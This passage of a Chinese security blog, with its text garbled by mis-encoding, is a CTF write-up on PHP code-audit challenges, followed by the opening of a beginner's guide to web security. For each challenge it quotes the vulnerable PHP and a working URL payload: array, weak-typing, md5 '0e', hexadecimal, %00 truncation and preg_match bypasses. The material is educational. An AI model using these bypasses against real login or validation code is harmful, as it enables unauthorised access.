<p>è¿˜æ˜¯æ•°ç»„ç»•è¿‡â€¦</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">19.php?password[]&#x3D;1</span><br></pre></td></tr></table></figure></div>

<hr>
<h2 id="å¼±ç±»å‹æ•´æ•°å¤§å°æ¯”è¾ƒç»•è¿‡"><a href="#å¼±ç±»å‹æ•´æ•°å¤§å°æ¯”è¾ƒç»•è¿‡" class="headerlink" title="å¼±ç±»å‹æ•´æ•°å¤§å°æ¯”è¾ƒç»•è¿‡"></a>å¼±ç±»å‹æ•´æ•°å¤§å°æ¯”è¾ƒç»•è¿‡</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//123.206.87.240:9009/22.php</span></span><br><span class="line"></span><br><span class="line">$temp = $_GET[<span class="string">'password'</span>];</span><br><span class="line">is_numeric($temp)?<span class="keyword">die</span>(<span class="string">"no numeric"</span>):<span class="keyword">NULL</span>;</span><br><span class="line"><span class="keyword">if</span>($temp&gt;<span class="number">1336</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> $flag;</span><br></pre></td></tr></table></figure></div>

<p>è¿™ä¸ªæˆ‘åœ¨åŸæ¥çš„å¼±ç±»å‹åˆ†æé‡Œä¹Ÿæåˆ°è¿‡äº†<br>ä»£ç è¦æ±‚ä¸èƒ½ä¸ºæ•°å­—ï¼Œ åˆè¯´è¦æ±‚ <code>$temp&gt;1336</code><br>æ„é€ Paylodï¼š</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">22.php?password&#x3D;1337a</span><br></pre></td></tr></table></figure></div>

<hr>
<h2 id="sha-å‡½æ•°æ¯”è¾ƒç»•è¿‡"><a href="#sha-å‡½æ•°æ¯”è¾ƒç»•è¿‡" class="headerlink" title="sha()å‡½æ•°æ¯”è¾ƒç»•è¿‡"></a>sha()å‡½æ•°æ¯”è¾ƒç»•è¿‡</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//123.206.87.240:9009/7.php</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$flag = <span class="string">"flag"</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'name'</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>($_GET[<span class="string">'password'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">var_dump($_GET[<span class="string">'name'</span>]);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">""</span>;</span><br><span class="line">var_dump($_GET[<span class="string">'password'</span>]);</span><br><span class="line">var_dump(sha1($_GET[<span class="string">'name'</span>]));</span><br><span class="line">var_dump(sha1($_GET[<span class="string">'password'</span>]));</span><br><span class="line"><span class="keyword">if</span> ($_GET[<span class="string">'name'</span>] == $_GET[<span class="string">'password'</span>])</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'Your password can not be your name!'</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (sha1($_GET[<span class="string">'name'</span>]) === sha1($_GET[<span class="string">'password'</span>]))</span><br><span class="line"><span class="keyword">die</span>(<span class="string">'Flag: '</span>.$flag);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">'Invalid password.'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">'Login first!'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
<p>æ ¹æ®é¢˜ç›®æ„æ€ï¼Œé¦–å…ˆ <code>_GET[&#39;name&#39;]</code>ï¼Œ <code>_GET[&#39;password&#39;]</code> ä¸¤è€…ä¸èƒ½ç›¸ç­‰ï¼›ç„¶å<code>sha1(_GET[&#39;name&#39;])</code> å’Œ <code>sha1(_GET[&#39;password&#39;])</code>å¿…é¡»å…¨ç­‰æ‰èƒ½å¾—åˆ°flagï¼›<br>emmmm æ•°ç»„ç»•è¿‡å°±å¥½äº†<br>Payload:</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">7.php?name[]&#x3D;1&amp;password[]&#x3D;2</span><br></pre></td></tr></table></figure></div>

<hr>
<h2 id="md5åŠ å¯†ç›¸ç­‰ç»•è¿‡"><a href="#md5åŠ å¯†ç›¸ç­‰ç»•è¿‡" class="headerlink" title="md5åŠ å¯†ç›¸ç­‰ç»•è¿‡"></a>md5åŠ å¯†ç›¸ç­‰ç»•è¿‡</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//123.206.87.240:9009/13.php</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$md51 = md5(<span class="string">'QNKCDZO'</span>);</span><br><span class="line">$a = @$_GET[<span class="string">'a'</span>];</span><br><span class="line">$md52 = @md5($a);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($a))&#123;</span><br><span class="line"><span class="keyword">if</span> ($a != <span class="string">'QNKCDZO'</span> &amp;&amp; $md51 == $md52) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"flag&#123;*&#125;"</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"false!!!"</span>;</span><br><span class="line">&#125;&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;<span class="keyword">echo</span> <span class="string">"please input a"</span>;&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
<p>åº”è¯¥æ˜¯ <code>0e</code> å¼€å¤´çš„æ¼æ´ï¼ŒPayload</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">13.php?a&#x3D;240610708</span><br></pre></td></tr></table></figure></div>

<hr>
<h2 id="åå…­è¿›åˆ¶ä¸æ•°å­—æ¯”è¾ƒ"><a href="#åå…­è¿›åˆ¶ä¸æ•°å­—æ¯”è¾ƒ" class="headerlink" title="åå…­è¿›åˆ¶ä¸æ•°å­—æ¯”è¾ƒ"></a>åå…­è¿›åˆ¶ä¸æ•°å­—æ¯”è¾ƒ</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//123.206.87.240:9009/20.php</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">noother_says_correct</span><span class="params">($temp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">$flag = <span class="string">'flag&#123;test&#125;'</span>;</span><br><span class="line">$one = ord(<span class="string">'1'</span>); <span class="comment">//ord â€” è¿”å›å­—ç¬¦çš„ ASCII ç å€¼</span></span><br><span class="line">$nine = ord(<span class="string">'9'</span>); <span class="comment">//ord â€” è¿”å›å­—ç¬¦çš„ ASCII ç å€¼</span></span><br><span class="line">$number = <span class="string">'3735929054'</span>;</span><br><span class="line"><span class="comment">// Check all the input characters!</span></span><br><span class="line"><span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; strlen($number); $i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// Disallow all the digits!</span></span><br><span class="line">$digit = ord($temp&#123;$i&#125;);</span><br><span class="line"><span class="keyword">if</span> ( ($digit &gt;= $one) &amp;&amp; ($digit &lt;= $nine) )</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// Aha, digit not allowed!</span></span><br><span class="line"><span class="keyword">return</span> <span class="string">"flase"</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($number == $temp)</span><br><span class="line"><span class="keyword">return</span> $flag;</span><br><span class="line">&#125;</span><br><span class="line">$temp = $_GET[<span class="string">'password'</span>];</span><br><span class="line"><span class="keyword">echo</span> noother_says_correct($temp);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p><code>number</code> ç­‰äº <code>temp</code> åˆ™è¿”å›flag<br><code>if (($digit &gt;= $one) &amp;&amp; ($digit &lt;= $nine))</code><br>å¤§äºç­‰äº1 å°äºç­‰äº9 éƒ½ä¸è¡Œ<br>è¦æ±‚ <code>temp = number = 3735929054</code><br>ç”¨åå…­è¿›åˆ¶ç»•è¿‡<br><code>0xdeadc0de = 3735929054</code><br>Payloadï¼š</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">20.php?password&#x3D;0xdeadc0de</span><br></pre></td></tr></table></figure></div>

<hr>
<h2 id="å˜é‡è¦†ç›–"><a href="#å˜é‡è¦†ç›–" class="headerlink" title="å˜é‡è¦†ç›–"></a>å˜é‡è¦†ç›–</h2><p>æ‰“ä¸å¼€</p>
<hr>
<h2 id="eregæ­£åˆ™-00æˆªæ–­"><a href="#eregæ­£åˆ™-00æˆªæ–­" class="headerlink" title="eregæ­£åˆ™%00æˆªæ–­"></a>eregæ­£åˆ™%00æˆªæ–­</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//123.206.87.240:9009/5.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$flag = <span class="string">"xxx"</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span> ($_GET[<span class="string">'password'</span>]))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (ereg (<span class="string">"^[a-zA-Z0-9]+$"</span>, $_GET[<span class="string">'password'</span>]) === <span class="keyword">FALSE</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'You password must be alphanumeric'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (strlen($_GET[<span class="string">'password'</span>]) &lt; <span class="number">8</span> &amp;&amp; $_GET[<span class="string">'password'</span>] &gt; <span class="number">9999999</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (strpos ($_GET[<span class="string">'password'</span>], <span class="string">'-'</span>) !== <span class="keyword">FALSE</span>) <span class="comment">//strpos â€” æŸ¥æ‰¾å­—ç¬¦ä¸²é¦–æ¬¡å‡ºç°çš„ä½ç½®</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">'Flag: '</span> . $flag);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span>(<span class="string">'- have not been found'</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'Invalid password'</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
<p>ä»£ç åˆ†æï¼š</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if (ereg (&quot;^[a-zA-Z0-9]+&quot;,_GET[&#39;password&#39;]) &#x3D;&#x3D;&#x3D; FALSE)</span><br></pre></td></tr></table></figure></div>

<p><code>password</code> åŒ¹é…å¿…é¡» a-zA-Z0-9 ä¹‹ä¸­ï¼Œè¿™ä¸ªå¯ä»¥ç”¨%00æˆªæ–­</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if (strlen(_GET[&#39;password&#39;]) &lt; 8 &amp;&amp;_GET[&#39;password&#39;] &gt; 9999999)</span><br></pre></td></tr></table></figure></div>
<p><code>password</code> å°äº8ä½æ•° ä¸” å¤§äº9999999ï¼Œè¿™ä¸ªç”¨æ•°ç»„ç»•è¿‡</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if (strpos ($_GET[&#39;password&#39;], &#39;-&#39;) !&#x3D;&#x3D; FALSE)</span><br></pre></td></tr></table></figure></div>
<p>åŒæ ·å¯ä»¥ç”¨æ•°ç»„ç»•è¿‡, Payloadå¦‚ä¸‹ï¼š</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">5.php?password[]&#x3D;a%00</span><br></pre></td></tr></table></figure></div>

<hr>
<h2 id="strposæ•°ç»„ç»•è¿‡"><a href="#strposæ•°ç»„ç»•è¿‡" class="headerlink" title="strposæ•°ç»„ç»•è¿‡"></a>strposæ•°ç»„ç»•è¿‡</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//123.206.87.240:9009/15.php</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$flag = <span class="string">"flag"</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span> ($_GET[<span class="string">'ctf'</span>])) &#123;</span><br><span class="line"><span class="keyword">if</span> (@ereg (<span class="string">"^[1-9]+$"</span>, $_GET[<span class="string">'ctf'</span>]) === <span class="keyword">FALSE</span>)</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'å¿…é¡»è¾“å…¥æ•°å­—æ‰è¡Œ'</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (strpos ($_GET[<span class="string">'ctf'</span>], <span class="string">'#biubiubiu'</span>) !== <span class="keyword">FALSE</span>)</span><br><span class="line"><span class="keyword">die</span>(<span class="string">'Flag: '</span>.$flag);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">'éªšå¹´ï¼Œç»§ç»­åŠªåŠ›å§å•Š~'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
<p>é¢˜ç›®éƒ½è¯´äº†æ˜¯æ•°ç»„ç»•è¿‡äº†<br>ç›´æ¥å°è¯•Payloadï¼š</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">15.php?ctf[]&#x3D;1</span><br></pre></td></tr></table></figure></div>
<p>emmmm æ²¡æƒ³åˆ°ç»•è¿‡äº† é‚£æ­£åˆ™æœ‰ä»€ä¹ˆç”¨â€¦</p>
<hr>
<h2 id="æ•°å­—éªŒè¯æ­£åˆ™ç»•è¿‡"><a href="#æ•°å­—éªŒè¯æ­£åˆ™ç»•è¿‡" class="headerlink" title="æ•°å­—éªŒè¯æ­£åˆ™ç»•è¿‡"></a>æ•°å­—éªŒè¯æ­£åˆ™ç»•è¿‡</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//123.206.87.240:9009/21.php</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$flag = <span class="string">'flag&#123;test&#125;'</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="string">"POST"</span> == $_SERVER[<span class="string">'REQUEST_METHOD'</span>])</span><br><span class="line">&#123;</span><br><span class="line">$password = $_POST[<span class="string">'password'</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="number">0</span> &gt;= preg_match(<span class="string">'/^[[:graph:]]&#123;12,&#125;$/'</span>, $password)) <span class="comment">//preg_match â€” æ‰§è¡Œä¸€ä¸ªæ­£åˆ™è¡¨è¾¾å¼åŒ¹é…</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'flag'</span>;</span><br><span class="line"><span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> (<span class="keyword">TRUE</span>)</span><br><span class="line">&#123;</span><br><span class="line">$reg = <span class="string">'/([[:punct:]]+|[[:digit:]]+|[[:upper:]]+|[[:lower:]]+)/'</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="number">6</span> &gt; preg_match_all($reg, $password, $arr))</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">$c = <span class="number">0</span>;</span><br><span class="line">$ps = <span class="keyword">array</span>(<span class="string">'punct'</span>, <span class="string">'digit'</span>, <span class="string">'upper'</span>, <span class="string">'lower'</span>); <span class="comment">//[[:punct:]] ä»»ä½•æ ‡ç‚¹ç¬¦å· [[:digit:]] ä»»ä½•æ•°å­— [[:upper:]] ä»»ä½•å¤§å†™å­—æ¯ [[:lower:]] ä»»ä½•å°å†™å­—æ¯</span></span><br><span class="line"><span class="keyword">foreach</span> ($ps <span class="keyword">as</span> $pt)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">"/[[:$pt:]]+/"</span>, $password))</span><br><span class="line">$c += <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ($c &lt; <span class="number">3</span>) <span class="keyword">break</span>;</span><br><span class="line"><span class="comment">//&gt;=3ï¼Œå¿…é¡»åŒ…å«å››ç§ç±»å‹ä¸‰ç§ä¸ä¸‰ç§ä»¥ä¸Š</span></span><br><span class="line"><span class="keyword">if</span> (<span class="string">"42"</span> == $password) <span class="keyword">echo</span> $flag;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">echo</span> <span class="string">'Wrong password'</span>;</span><br><span class="line"><span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
<p>é‡ç‚¹ï¼š</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; æ»¡è¶³æ¡ä»¶</span><br><span class="line">if (0 &gt;&#x3D; preg_match(&#39;&#x2F;^[[:graph:]]&#123;12,&#125;&#x2F;&#39;,password)) &#x2F;&#x2F;preg_match â€” æ‰§è¡Œä¸€ä¸ªæ­£åˆ™è¡¨è¾¾å¼åŒ¹é…</span><br><span class="line">&#x2F;&#x2F;å¾—åˆ°flag</span><br><span class="line">&#123;</span><br><span class="line">echo &#39;flag&#39;;</span><br><span class="line">exit;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p><code>preg_match()</code>è¿”å› <code>pattern</code> çš„åŒ¹é…æ¬¡æ•°ã€‚ å®ƒçš„å€¼å°†æ˜¯0æ¬¡ï¼ˆä¸åŒ¹é…ï¼‰æˆ–1æ¬¡ï¼Œå› ä¸º<code>preg_match()</code>åœ¨ç¬¬ä¸€æ¬¡åŒ¹é…åï¼Œå°†ä¼šåœæ­¢æœç´¢ã€‚<code>preg_match_all()</code>ä¸åŒäºæ­¤ï¼Œå®ƒä¼šä¸€ç›´æœç´¢<code>subject</code> ç›´åˆ°åˆ°è¾¾ç»“å°¾ã€‚ å¦‚æœå‘ç”Ÿé”™è¯¯<code>preg_match()</code>è¿”å› FALSE</p>
<p>ç›´æ¥POSTä¸€ä¸ªpasswordå°±å¯ä»¥ï¼Œå¹¶ä¸”å°äº12ä¸ªå­—ç¬¦ã€‚<br>payload: <code>POST:password=1</code></p>
<hr>
<h2 id="ç®€å•çš„waf"><a href="#ç®€å•çš„waf" class="headerlink" title="ç®€å•çš„waf"></a>ç®€å•çš„waf</h2><p>æ‰“ä¸å¼€</p>
]]></content>
      <categories>
        <category>å­¦ä¹ ç¬”è®°</category>
      </categories>
      <tags>
        <tag>writeup</tag>
        <tag>ctf</tag>
        <tag>code audit</tag>
      </tags>
  </entry>
  <entry>
    <title>webå…¥é—¨å­¦ä¹ æ€»ç»“ï¼ˆè¯¯ï¼‰</title>
    <url>/yakko117/2019/04/02/web%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\yakko117\assets\css\APlayer.min.css"><script src="\yakko117\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\yakko117\assets\js\Meting.min.js"></script><h2 id="é›¶åŸºç¡€çš„æˆ‘ï¼Œå¦‚ä½•å…¥é—¨"><a href="#é›¶åŸºç¡€çš„æˆ‘ï¼Œå¦‚ä½•å…¥é—¨" class="headerlink" title="é›¶åŸºç¡€çš„æˆ‘ï¼Œå¦‚ä½•å…¥é—¨"></a>é›¶åŸºç¡€çš„æˆ‘ï¼Œå¦‚ä½•å…¥é—¨</h2><p>é¦–å…ˆé—®è‡ªå·±å‡ ä¸ªé—®é¢˜ï¼š</p>
<ul>
<li>æˆ‘ä¼šè‡ªå­¦å—ï¼Ÿ</li>
<li>é‡åˆ°é—®é¢˜æ—¶ï¼Œæ˜¯å¦ä¼šå–„äºé€šè¿‡ç™¾åº¦ç­‰æ–¹æ³•è§£å†³å—ï¼Ÿ</li>
<li>åœ¨åªæœ‰è‹±æ–‡æ–‡çŒ®èµ„æ–™æ—¶ï¼Œè‡ªèº«æ°´å¹³ä¸è¡Œæ—¶ï¼Œæ˜¯å¦ä¼šç”¨ç¿»è¯‘è½¯ä»¶ä¸€ç‚¹ä¸€ç‚¹å»è¯»ï¼Ÿ</li>
<li>åœ¨å‘ä»–äººè¯¢é—®é—®é¢˜æ—¶ï¼Œæ˜¯å¦æ³¨æ„è¿‡é—®é—®é¢˜çš„ç¤¼ä»ªç»†èŠ‚ï¼Ÿï¼ˆç¤¼è²Œé—®é¢˜ï¼Œä»¥åŠä¼šå°†é—®é¢˜è¡¨è¿°æ¸…æ¥šï¼Œé‡åˆ°äº†å“ªäº›é—®é¢˜ï¼Œå°è¯•äº†ä»€ä¹ˆæ–¹æ³•ï¼Œç»“æœå¦‚ä½•éƒ½è¡¨è¿°æ¸…æ¥šï¼›è€Œä¸æ˜¯ç®€å•çš„ä¸€å¥è¯ï¼šè¿™æ€ä¹ˆå¼„ï¼Ÿï¼‰</li>
<li>åœ¨é¢å¯¹é—®é¢˜æ— æ³•è§£å†³ï¼Œé•¿æœŸå­¦ä¹ æ•ˆæœä¸ä½³æ—¶ï¼Œæ˜¯å¦ä¼šå’¬ç‰™åšæŒä¸‹å»ï¼›åœ¨èº«è¾¹åŒå­¦éƒ½åœ¨ç©ç€æ¸¸æˆï¼Œä¸Šå®Œè¯¾å¯ä»¥å¥½å¥½ä¼‘æ¯çœ‹çœ‹æ‰‹æœºï¼Œå‘¨æœ«çº¦å¥½å‡ºå»æ¸¸ç©æ—¶ï¼Œè‡ªå·±æ˜¯å¦ä¼šæ²‰ä¸‹å¿ƒæ¥å­¦ä¹ å—ï¼Ÿ</li>
</ul>
<hr>
<p>æ²¡æœ‰åŸºç¡€å¦‚ä½•å…¥é—¨ï¼Œå¦‚ä½•å­¦å®‰å…¨ï¼Œå¦‚ä½•æ—¥ç«™<br>é¦–å…ˆï¼Œæœ€é‡è¦çš„ä¸€å®šæ˜¯<strong>å­¦å¥½ç¼–ç¨‹ã€å­¦å¥½ç¼–ç¨‹ã€å­¦å¥½ç¼–ç¨‹</strong>ã€‚æ— æ•°æ»¡æ€€æ†§æ†¬çš„èŒæ–°éƒ½æ­»åœ¨äº†è¿™ï¼ˆç¬”è€…æœ¬äººç¼–ç¨‹åŸºç¡€ä¹Ÿä¸æ€ä¹ˆå¥½ï¼‰ï¼Œè§‰å¾—ç¼–ç¨‹æ¯ç‡¥ï¼Œæ²¡æ„æ€ï¼Œç„¶åå°±æ”¾å¼ƒäº†ï¼›ç¼–ç¨‹è¯­è¨€ä½œä¸ºåŸºç¡€ï¼Œå¦‚æœä¸ä¼šå’Œè®¡ç®—æœºäº¤æµï¼Œå°±æ²¡å¿…è¦å†å»è¯´åç»­çš„æŒ–æ´å’Œæ¸—é€äº†ï¼Œå½“ä½ è¿ç®€å•çš„ä»£ç å®¡è®¡éƒ½åšä¸åˆ°ï¼Œå¦‚ä½•å»åˆ¤æ–­æ¼æ´ä¸ºSQLæ³¨å…¥ï¼Œè¿˜æ˜¯xssç­‰ç­‰ï¼›<strong>æ‰€ä»¥è¯·å…ˆä»ç¼–ç¨‹å¼€å§‹å…¥æ‰‹å­¦ä¹ ï¼Œä¸€å®šè¦å¼„æ˜ç™½è‡ªå·±åˆ°åº•æƒ³è¦çš„æ˜¯ä»€ä¹ˆï¼Œä¿æŒä¸€é¢—è™”è¯šå‘å­¦çš„å¿ƒã€‚</strong>ï¼ˆOS:æˆ‘è¿˜åšä¸åˆ°ï¼‰</p>
<p>å…³äºç¼–ç¨‹è¯­è¨€ï¼Œæ¨èä»¥ä¸‹ä¸‰ç§ï¼šï¼ˆæœ‰èƒ½åŠ›è‡ªæˆ‘å­¦ä¹ æ›´å¤šæ›´å¥½ï¼‰</p>
<ul>
<li>C:ä½œä¸ºä¸‡ç‰©ä¹‹æºï¼ˆè¯¯ï¼‰ï¼Œå¥½å¥½çš„å­¦C,ä¸ä»…ä»…æ˜¯å¯¹webå®‰å…¨æœ‰å¸®åŠ©ã€‚<br>: <strong><del>PHPæ˜¯ä¸–ç•Œä¸Šæœ€å¥½çš„è¯­è¨€</del></strong>ï¼Œç°é˜¶æ®µweb code auditæœ€å¸¸è§çš„è¯­è¨€ï¼Œä¸æ±‚æŒæ¡ï¼Œä½†ä¸€å®šè¦å»å­¦ä¼šè¯†åˆ«å‡½æ•°ï¼Œå­¦ä¼šä»£ç å®¡è®¡ï¼›</li>
<li>Python: <del>ç»å¯¹æ˜¯æœ€å¥½å…¥é—¨çš„è¯­è¨€äº†ï¼Œæ²¡æœ‰ä¹‹ä¸€ã€‚å¯ä»¥åœ¨å¾ˆçŸ­æ—¶é—´å†…å†™å‡ºå¾ˆå®ç”¨çš„å·¥å…·ï¼Œä¹Ÿå¾ˆæ¨èï¼Œä½†æ˜¯è¯·è®°ä½ï¼Œ<strong>ä¸€å®šè¦æŠ½æ—¶é—´æ¥å­¦ä¹ Cè¯­è¨€ï¼</strong></del></li>
</ul>
<p>å¹³å¸¸å¯ä»¥çœ‹ä¸€äº›å…³äºå®‰å…¨çš„æ–°é—»ï¼Œäº†è§£ä¸€ä¸‹æ¯”è¾ƒçƒ­é—¨çš„å®‰å…¨æŠ€æœ¯ï¼Œå…³æ³¨ä¸€ä¸‹æœ€æ–°çš„æ¼æ´ï¼›è¿™æ ·ä»¥åå½“ä½ ä¸çŸ¥é“å­¦ä»€ä¹ˆçš„æ—¶å€™ï¼Œè¿™äº›æŠ€æœ¯å°±æ˜¯ä½ è¦å­¦çš„ä¸œè¥¿ï¼Œä½†æ˜¯è¯·æ³¨æ„ï¼Œä¸€å®šè¦æ‰“å¥½åŸºç¡€ï¼Œä¸è¦æ€¥äºæ±‚æˆï¼Œä»Šå¤©è¿˜åœ¨å­¦1+1=2ï¼Œç¬¬äºŒå¤©æƒ³å»å­¦ä¼šæ³°å‹’å…¬å¼ï¼Œæ€ä¹ˆå¯èƒ½ï¼Ÿ</p>
<hr>
